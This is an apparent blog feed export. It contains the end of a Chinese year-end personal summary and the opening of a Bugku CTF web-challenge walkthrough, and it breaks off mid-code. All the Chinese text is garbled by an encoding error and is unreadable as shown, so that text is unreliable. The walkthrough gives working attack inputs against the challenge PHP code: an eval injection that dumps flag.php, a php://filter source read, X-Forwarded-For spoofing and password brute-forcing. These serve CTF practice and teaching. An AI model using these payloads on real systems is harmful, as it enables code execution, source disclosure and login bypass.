·ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å‚åŠ ï¼Œå¤§å¼€çœ¼ç•Œï¼Œä¹Ÿæ˜¯å­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼Œè¿˜è§åˆ°äº†å¥½å¤šå¾ˆå‰å®³çš„å¤§ä½¬å’ŒåŒé¾„äººï¼Œä½†æ˜¯å—å®æ˜¯çœŸçš„çƒ­ï¼ï¼ï¼</p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/b8820082b169ad9a.jpg"></p><p>è¿åƒä¸ƒå¤©çš„ç›’é¥­ï¼ŒçœŸçš„æ˜¯å¯¹é‚£é…’åº—ä¸å’¸ä¸æ·¡çš„æ¦¨èœäº§ç”Ÿäº†é˜´å½±</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231023304.png" alt="æ¯å¤©çš„é¥­ç¥¨"></p><p>hw å®Œä¹‹åæƒ³å»è¥¿å¤§é‡Œé¢çœ‹çœ‹çš„ï¼Œä½†æ˜¯æ— å¥ˆç–«æƒ…æœŸé—´ä¸èƒ½è¿›å»ï¼Œåªæ˜¯åœ¨é—¨å£æ‹äº†ä¸€å¼ ç•™ä½œçºªå¿µï¼Œä½†æ˜¯ä¸‹åŠå¹´å€’æ˜¯å»äº†è¥¿å¤§é‡Œé¢æ‰“äº†ä¸ªæ¯”èµ›ï¼Œè¿˜æœ‰å»å¹¿è¥¿äº¤é™¢çœ‹äº†çœ‹ï¼Œå­¦æ ¡æŒºåçš„ï¼Œè·Ÿæ¡‚ç”µæœ‰å¾—ä¸€æ‹¼ï¼Œä½†æ˜¯é¢ç§¯å¾ˆå¤§ï¼Œç»¿åŒ–ä¹Ÿå¾ˆè‡ªç„¶</p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/f65676d497676a2a.jpg" alt="è¥¿å¤§å¿˜äº†å“ªä¸ªé—¨å£"></p><p><img src="https://i.loli.net/2020/12/31/ieK6hSTWJvGRxs4.jpg" alt="äº¤é™¢"></p><p>å‰©ä¸‹çš„æš‘å‡é‡Œè·Ÿé˜Ÿå‹ä»¬æ‰“äº†å¼ºç½‘æ¯ï¼Œæ‹¿åˆ°äº†æˆ‘è½¬ä¸“ä¸šçš„ç¬¬äºŒå¼ å¥–çŠ¶ï¼Œæ¯”èµ›é¢˜ç›®çš„è´¨é‡å¾ˆé«˜ï¼Œæ˜å¹´å¸Œæœ›èƒ½äº‰å–æ‰“è¿›çº¿ä¸‹ï¼Œä¸Šä¸€æ¬¡ç›´æ’­ï¼</p><p><img src="https://i.loli.net/2020/12/31/IYJ9y2gtdWsj6Gk.jpg" alt="å¼ºç½‘å…ˆé”‹"></p><hr><blockquote><p>2020.12.29 æ›´æ–°</p></blockquote><h1 id="ä¸‹åŠå¹´"><a href="#ä¸‹åŠå¹´" class="headerlink" title="ä¸‹åŠå¹´"></a>ä¸‹åŠå¹´</h1><h2 id="æ¬å®¶"><a href="#æ¬å®¶" class="headerlink" title="æ¬å®¶"></a>æ¬å®¶</h2><p>ä¸‹åŠå¹´å›æ ¡åçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯æ¬å®¶ï¼Œç¤¾å›¢ä»åŸæ¥çš„å°å±‹å­æ¬åˆ°äº†ç°åœ¨çš„å±±æ™¯æˆ¿å¤§å±‹å­ï¼Œæ–°å®¶ä¾æ—§æ˜¯é‡‡ç”¨å·¥ä½œä¸ç”Ÿæ´»ç»“åˆã€ä¸Šç­ä¸ä¸‹ç­æ— ç¼è¡”æ¥çš„ç»å…¸è®¾è®¡</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231024453.png" alt="17æ•™"></p><p><img src="https://i.loli.net/2020/12/31/c7rsJ8eZWVL4lOo.jpg" alt="æ•£æ­¥ç°åœº"></p><p><img src="https://i.loli.net/2020/12/31/Yptd2GaSsK63e7u.jpg" alt="é˜´å¤©"></p><p><img src="https://i.loli.net/2020/12/31/D78eKHwkS9LUhFi.jpg" alt="æ–°å®¶äº”æ¥¼é£å…‰"> </p><p>ä»¥å‰è§‰å¾—17æ•™çš„å°å±‹å­è¿˜æŒºå‡‘åˆçš„ï¼Œç°åœ¨ä½å¤§æˆ¿å­ä¹ æƒ¯äº†å›è¿‡å¤´å»çœ‹ï¼Œæ„Ÿè§‰æ˜¯çœŸçš„å°</p><p><img src="https://i.loli.net/2020/12/31/UjseNSD1Yqaf37y.jpg" alt="è€åº§ä½"></p><p><img src="https://i.loli.net/2020/12/31/l9HkcyKfiTIetV7.jpg" alt="è€å®¿èˆ"></p><p><img src="https://i.loli.net/2020/12/31/mS4hG6Fc7wCVUtx.jpg" alt="æ–°å®¿èˆ"></p><p><img src="https://i.loli.net/2020/12/31/t2a371w8ORoDQNi.jpg" alt="æ–°å®¶"></p><p>å‰åŠä¸ªæœˆè¿‡æ¥ä½ï¼Œæ„Ÿè§‰æŒºä¸é€‚åº”çš„ï¼Œç©ºæ°”éƒ½æ˜¯é™Œç”Ÿçš„ï¼Œä¹Ÿå¤±çœ äº†ä¸€å°æ®µæ—¶é—´ï¼Œä½†æ˜¯æ…¢æ…¢çš„è¿˜æ˜¯é€‚åº”äº†ï¼Œä»Šåä¸‰å¹´ä¹Ÿä¼šå¥½å¥½å½“å¥½æœ€åä¸€å±Šå®ˆå¤œäºº</p><hr><h2 id="è½¬ä¸“ä¸š"><a href="#è½¬ä¸“ä¸š" class="headerlink" title="è½¬ä¸“ä¸š"></a>è½¬ä¸“ä¸š</h2><p>å¤§ä¸€ä¸€å¹´çš„åŠªåŠ›ç¡®å®æ²¡æœ‰ç™½è´¹ï¼ŒåŠ ä¸Šåä¼šçš„å­¦é•¿ä»¬å’Œè€å¸ˆçš„å¸®åŠ©ï¼Œä¹Ÿæ˜¯å¦‚æ„¿ä»¥å¿è½¬åˆ°äº†ä¿¡æ¯å®‰å…¨ä¸“ä¸šï¼Œä»¥åå°±æ˜¯åæ­£è¨€é¡ºäº†ï¼Œè½¬è¿‡æ¥ä»¥åä¹Ÿè®¤è¯†äº†å¾ˆå¤šæ–°æœ‹å‹æ–°åŒå­¦ï¼Œä¹‹å‰ä¸€ç›´æ˜¯å­¤å­¤å•å•ä¸€ä¸ªäººæï¼Œç°åœ¨ç»ˆäºè®¤è¯†äº†æ›´å¤šå¿—åŒé“åˆçš„äººï¼Œå¾ˆä¸é”™</p><p><img src="https://i.loli.net/2020/12/31/PqL9DdsZfcV4IQW.png" alt="åæ­£è¨€é¡º"></p><p>æ‰€ä»¥è¿™ä¸ªå­¦æœŸä¹Ÿæ˜¯è›®æ‹¼ï¼Œè¦ä¸Šå¤§äºŒçš„ä¸“ä¸šè¯¾ï¼Œè¦è¡¥å¤§ä¸€çš„ä¸¤é—¨è¯¾ï¼Œæˆ‘è¿˜æå‰ä¸Šäº†å¤§ä¸‰çš„ä¸¤é—¨è¯¾ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå­¦æœŸè·¨äº†ä¸‰ä¸ªå¹´çº§ä¸Šï¼Œç´¯æ˜¯æœ‰ç‚¹ç´¯ï¼Œä½†æ˜¯ä¹‹åå°±è½»æ¾äº†</p><hr><h2 id="æ‹›æ–°"><a href="#æ‹›æ–°" class="headerlink" title="æ‹›æ–°"></a>æ‹›æ–°</h2><p>ä»Šå¹´æ‹›æ–°æˆ‘åŸæœ¬ä»¥ä¸ºå¾ˆéš¾æ‹›åˆ°äººäº†ï¼Œå› ä¸ºçªç„¶æ¬å®¶çš„åŸå› ï¼Œå¯¼è‡´æš‘å‡æ—¶åšçš„æ‹›æ–°ç´ æç›´æ¥æŠ¥åºŸï¼Œå¼€å­¦åæ‰ä¸´æ—¶åšäº†æ–°çš„æ‹›æ–°è§†é¢‘å’Œæµ·æŠ¥ï¼Œç­‰å…¶ä»–å‡ ä¸ªå…„å¼Ÿç¤¾å›¢éƒ½æ‹›æ–°å®Œäº†æ‰å¼€å§‹æˆ‘ä»¬çš„æ‹›æ–°ï¼Œä¸è¿‡æœ‰ç¼˜æ¯•ç«Ÿæ˜¯æœ‰ç¼˜ï¼Œä»Šå¹´æ‹›åˆ°äº†ä¸‰ä¸ªå¼Ÿå¼Ÿä¸€ä¸ªå¦¹å¦¹ï¼Œä¹Ÿç®—äº†äº†æˆ‘ä¸€ä»¶å¿ƒäº‹äº†</p><hr><h2 id="è¥¿å¤§çº¿ä¸‹èµ›"><a href="#è¥¿å¤§çº¿ä¸‹èµ›" class="headerlink" title="è¥¿å¤§çº¿ä¸‹èµ›"></a>è¥¿å¤§çº¿ä¸‹èµ›</h2><p><a href="https://c1everf0x.github.io/2020/10/27/2020%E8%A5%BF%E5%A4%A7%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/">è¥¿å¤§æµæ°´è´¦</a> ç‚¹å‡»å³å¯</p><h2 id="æ¡Œé¢å˜è¿"><a href="#æ¡Œé¢å˜è¿" class="headerlink" title="æ¡Œé¢å˜è¿"></a>æ¡Œé¢å˜è¿</h2><p>ä¸€å¹´è¿‡å»ï¼Œæˆ‘çš„æ¡Œé¢æ˜¯è¶Šæ•´è¶ŠèŠ±é‡Œèƒ¡å“¨</p><ul><li>æ·»åŠ é”®ç›˜å’Œæ˜¾ç¤ºå™¨</li></ul><p><img src="https://i.loli.net/2020/12/31/fr7ZCYcx6RzIATp.jpg" alt="åˆä»£"></p><ul><li>æ·»åŠ é£æ‰‡ã€è€³æœºã€æ–°é”®ç›˜</li></ul><p><img src="https://i.loli.net/2020/12/31/6WqzoQXURF17uVp.jpg" alt="äºŒä»£"></p><ul><li>æ·»åŠ é­”æ³•å¡æŒ¡æ‘„åƒå¤´ã€è€å¹´åŠ©å¬å™¨ã€æ–°é”®ç›˜ã€æ¸¸æˆæ‰‹æŸ„ã€ç‹ç‹¸ç©å¶ã€wifiæ”»å‡»æ¨¡å—ã€çœ¼è¯æ°´ã€æ‰‹ç¯*2</li></ul><p><img src="https://i.loli.net/2020/12/31/wSkz9IcK8Ea43qg.jpg" alt="ä¸‰ä»£"></p><ul><li>æ›´æ¢åŠå…¬åœºæ™¯ã€æ·»åŠ æ˜¾ç¤ºå™¨å¢é«˜æ¶ã€è–„è·ç³–ã€ä¹¦ã€switchã€è¯ç›’</li></ul><p><img src="https://i.loli.net/2020/12/31/En2jDsFxXOV59rd.jpg" alt="å››ä»£"></p><ul><li>æ¡Œé¢æ•´ç†</li></ul><p><img src="https://i.loli.net/2020/12/31/5oNJwsu3UVljErK.jpg" alt="äº”ä»£"></p><ul><li>å¢åŠ é˜¿ç±³æ´›å¤§æ¡Œå«ã€ç¬”ç­’ã€å°ç±³æ˜¾ç¤ºå™¨æŒ‚ç¯ã€æ°´æ¯ã€æ›´æ¢æ–°çš„å°å¡ç‰‡</li></ul><p><img src="https://i.loli.net/2020/12/31/QTqIeCmXKbtHZuz.jpg" alt="ç°åœ¨"></p>]]></content>
      
      
      <categories>
          
          <category> å¹´ç»ˆæ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¹´ç»ˆæ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugkuæ–°å¹³å°-Web-wp</title>
      <link href="/posts/16041/"/>
      <url>/posts/16041/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>Bugkuæ–°å¹³å°çœŸä¸é”™ï¼Œä»¥å‰è€å¹³å°çš„é¢˜ ak äº†ä¸€ç›´æ²¡æœ‰æ€»ç»“ wp ï¼Œè¿™å›é‡æ–°æ‰“ä¸€é<del>å†™ä¸ª wp</del>(æ°´ç¯‡åšå®¢)</p></blockquote><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>F12æŸ¥çœ‹æºç å¾—åˆ°<code>flag</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230004.png"></p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>F12ä¿®æ”¹å‰ç«¯JSå¯¹è¾“å…¥é•¿åº¦çš„é™åˆ¶</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230258.png"></p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>è€èŒæ–°é¢˜äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“å°ä¸¤ä¸ªflagå‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">flagflag&#123;cd6f8684b6df613bf86e161e3d22ab98&#125; flag&#123;cd6f8684b6df613bf86e161e3d22ab98&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230515.png"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>æ‡‚å¾—éƒ½æ‡‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230706.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><code>is_numeric</code>å‡½æ•°ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æˆªæ–­æ¼æ´ï¼Œå‡½æ•°å¯¹äºç©ºå­—ç¬¦<code>%00</code>ï¼Œæ— è®ºæ˜¯<code>%00</code>æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ<code>%20</code>ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åæ‰èƒ½è®©å…¶åˆ¤æ–­ä¸ºFalse</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210233808.png"></p><p><code>is_numeric</code>å‡½æ•°å¦ä¸€ä¸ªç»å…¸çš„æ¼æ´æ˜¯åå…­è¿›åˆ¶ç»•è¿‡æ¼æ´ï¼Œå¦‚æœè¿™ä¸ªå‡½æ•°å’Œmysqlç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œå°±å®¹æ˜“å‡ºé—®é¢˜</p><ul><li><p>å‡½æ•°åœ¨åˆ¤æ–­çš„æ—¶å€™ï¼Œç¢°åˆ°åå…­è¿›åˆ¶æ•°çš„æ—¶å€™ï¼Œä¹Ÿä¼šåˆ¤æ–­æˆæ•°å­—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="number">233333</span>);       <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;233333&#x27;</span>);  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="number">0x233333</span>);  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;0x233333&#x27;</span>);   <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;233333abc&#x27;</span>);  <span class="comment"># 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MySQLæ•°æ®åº“åŒæ ·æ”¯æŒ16è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯HEXç¼–ç ã€‚è™½ç„¶ä¸åƒis_numericå‡½æ•°ä¸€æ ·æœ‰ç€æ¯”è¾ƒå¼ºçš„å®¹é”™æ€§ï¼Œä½†è¿˜æ˜¯èƒ½å¤Ÿå®Œæˆå¦‚ä¸‹æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; insert into test (id, value) values (1, 0x74657374);</span><br><span class="line">&gt; select * from test;</span><br><span class="line">| id | value |</span><br><span class="line">| 1  | test  |</span><br></pre></td></tr></table></figure></li></ul><p>åœ¨<code>is_numeric</code>å‡½æ•°å•ç‹¬ä½¿ç”¨çš„æƒ…å†µï¼Œæˆ–è€…ç‰¹å®šæƒ…å†µä¸‹ï¼Œå¯ä»¥å°†SQLæ³¨å…¥çš„payloadè½¬åå…­è¿›åˆ¶ä¼ è¿›å»ç»•è¿‡waf</p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>æŠ“åŒ…é‡æ”¾å‘ç°ä¸€å †HTMLå®ä½“ç¼–ç </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210234924.png"></p><p>æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è½¬ä¸€ä¸‹å°±è¡Œ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210235517.png"></p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>è€ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶äº†ï¼ŒF12æ‰“å¼€æŒç»­è®°å½•ï¼Œæ‰¾ä¼ è¾“å›æ¥çš„åŒ…æœ‰å“ªä¸ªæœ‰ä¸åŒï¼Œç„¶åå†çœ‹å“åº”</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211000514.png"></p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>ç®€å•çš„æœ¬åœ°æ–‡ä»¶åŒ…å«+é—­åˆç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯ï¼šé—­åˆæ‰<code>var_dump</code>ç„¶åæ„é€ phpè¯­å¥æŠŠåŒ…å«çš„<code>flag.php</code>æ‰“å°å‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="comment">//å¦‚æœä¼ å‚  hello=1);print_r(file(&quot;./flag.php&quot;));//</span></span><br><span class="line"><span class="comment">//æ‹¼æ¥è¿›evalå¾—åˆ°</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(1);print_r(file(&quot;</span>./flag.php<span class="string">&quot;));//);&quot;</span>);</span><br><span class="line"><span class="comment">// //æ³¨é‡Šæ‰åŸæ¥var_dumpç•™ä¸‹æ¥çš„ );</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœä¼ å‚ hello=1);print_r(file(&quot;./flag.php&quot;)</span></span><br><span class="line"><span class="comment">//æ‹¼æ¥è¿›evalå¾—åˆ°</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(1);print_r(file(&quot;</span>./flag.php<span class="string">&quot;));&quot;</span>);</span><br><span class="line"><span class="comment">//åˆ©ç”¨äº†åŸæ¥var_dumpç•™ä¸‹æ¥çš„ );</span></span><br></pre></td></tr></table></figure><blockquote><p><code>print_r</code>å’Œ<code>var_dump</code>éƒ½å¯ä»¥ç”¨æ¥æ‰“å°flag.php</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211001515.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w+$/&quot;</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™çš„æ„æ€æ˜¯åªèƒ½è¾“å…¥å¤§å°å†™å­—æ¯å’Œ0-9æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œ<code>eval(&quot;var_dump($$args);&quot;);</code>ä¸­çš„<code>$$args</code>æ˜ç¤º<code>$args</code>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥ç”¨<code>GLOBALS</code>è¶…çº§å…¨å±€å˜é‡æ¥è§£</p><blockquote><p><code>$GLOBALS</code>ç”¨æ¥å­˜å‚¨å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡çš„å€¼åœ¨<code>$GLOBALS</code>é‡Œé¢æ˜¯ä¸€ä¸ªé”®å€¼ï¼Œå³å…¨å±€å˜é‡å¯ä»¥é€šè¿‡è‡ªå·±çš„å˜é‡ååœ¨<code>$GLOBALS</code>æ‰¾åˆ°ç›¸å¯¹åº”çš„å€¼</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211004423.png"></p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>æŠ“åŒ…é‡æ”¾ï¼Œå“åº”å¤´é‡Œçœ‹åˆ°flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211005101.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>æ‰«ç›®å½•å‘ç°<code>shell.php</code>ï¼Œçˆ†ç ´<code>shell.php</code>å¾—åˆ°å¯†ç <code>hack</code>ï¼Œæ‹¿åˆ°flag</p><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p>F12å‘ç°<code>dGVzdDEyMw==</code>ï¼Œè§£base64å¾—<code>test123</code>ï¼ŒçŒœæµ‹è´¦å·<code>admin</code>ï¼ŒåŠ ä¸Š<code>x-forwarded-for:127.0.0.1</code>å³å¯</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p>é¢˜ç›®æç¤ºæŸ¥çœ‹æºç ï¼Œå‘ç°æºç <code>&lt;script&gt;</code>æ ‡ç­¾é‡Œæœ‰URLç¼–ç ï¼Œ<br> p1è§£ç ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkSubmit</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;67d709b2b1234</span></span><br></pre></td></tr></table></figure><p>p2è§£ç ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">aa648cf6e87a7114f1<span class="string">&quot;==a.value)</span></span><br><span class="line"><span class="string">return!0;</span></span><br><span class="line"><span class="string">alert(&quot;</span><span class="title class_">Error</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">a.focus();</span></span><br><span class="line"><span class="string">return!1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>levelQuest<span class="string">&quot;).onsubmit=checkSubmit;12345678</span></span><br></pre></td></tr></table></figure><p>æœ€åçš„eval(unescape(p1) + unescape(â€˜%35%34%61%61%32â€™ + p2));è§£ç ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;54aa2&#x27;</span> + p2));<span class="number">1</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®eval()æ‰§è¡Œä»£ç å—çš„æ„æ€æ‹¼æ¥å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;</span><br><span class="line">var a=document.getElementById(&quot;password&quot;);</span><br><span class="line">//getElementByIdæ ¹æ®æŒ‡å®šçš„ id å±æ€§å€¼å¾—åˆ°å¯¹è±¡</span><br><span class="line">if(&quot;undefined&quot;!=typeof a)&#123;</span><br><span class="line">if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</span><br><span class="line">return!0;</span><br><span class="line">alert(&quot;Error&quot;);</span><br><span class="line">a.focus();</span><br><span class="line">return!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</span><br><span class="line">//onsubmit äº‹ä»¶ä¼šåœ¨è¡¨å•ä¸­çš„ç¡®è®¤æŒ‰é’®è¢«ç‚¹å‡»æ—¶å‘ç”Ÿ12345678910111213</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å˜é‡açš„å€¼æ˜¯å¦ç­‰äº67d709b2b54aa2aa648cf6e87a7114f1<br> å¥½åƒç›´æ¥è¾“å…¥å­—ç¬¦ä¸²æäº¤å°±å¯ä»¥å¾—åˆ°flagã€‚</p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p><code>php://filter/read=convert.base64-encode/resource=</code></p><p>ä¼ªåè®®è¯»æºç ï¼Œè§£ç å¾—åˆ°flag</p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p>burpsuite ä¸€æŠŠæ¢­ å¯†ç 1****</p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p><code>index.php.bak</code>æ‹¿åˆ°phpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 